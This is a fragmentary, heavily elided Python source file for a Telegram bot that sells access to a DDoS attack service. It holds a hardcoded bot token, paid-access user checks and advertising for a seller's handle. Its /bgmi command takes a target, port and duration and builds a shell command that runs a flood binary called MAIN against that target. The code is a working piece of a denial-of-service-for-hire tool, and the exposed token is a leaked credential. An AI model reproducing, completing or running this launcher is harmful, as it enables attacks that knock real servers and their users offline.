...
bot = telebot.TeleBot('7837130437:AAFoD7W9q3yAs9zQBrHN8VYRVPlAziurwZE')
...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐𝒕 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎:- @DEVILVIPDDOS"
...
✅ Usage: /remove <userid>'''
        ...
        response = "🔐 𝐤𝐞𝐲 𝐞𝐱𝐩𝐢𝐫𝐞:- @DEVILVIPDDOS ❤️."
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 600:
                ...
                full_command = f"./MAIN {target} {port} {time} 10"
        ...
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. ᴅᴍ ᴛᴏ ʙᴜʏ ᴀᴄᴄᴇss ᴄʟɪᴄᴋ ʜᴇʀᴇ sᴇᴇ ᴅ-ᴅᴏs /plan 1⃣ ᴅᴀʏ ғʀᴇᴇ ᴛʀɪᴀʟ ᴀʟᴏsᴏ ᴀᴠᴀɪʟᴀʙʟᴇ:- @DEVILVIPDDOS / @DEVILVIPDDOS 🤡")
...
💥 /plan : Our rates are cheap, you can afford the plans Dm @DEVILVIPDDOS.




Buy From :- @DEVILVIPDDOS ✅

Official Channel :- https://t.me/DEVILVIPDDOSS
'''
...
✅ That Was Get Your Access From :- @DEVILVIPDDOS☠️
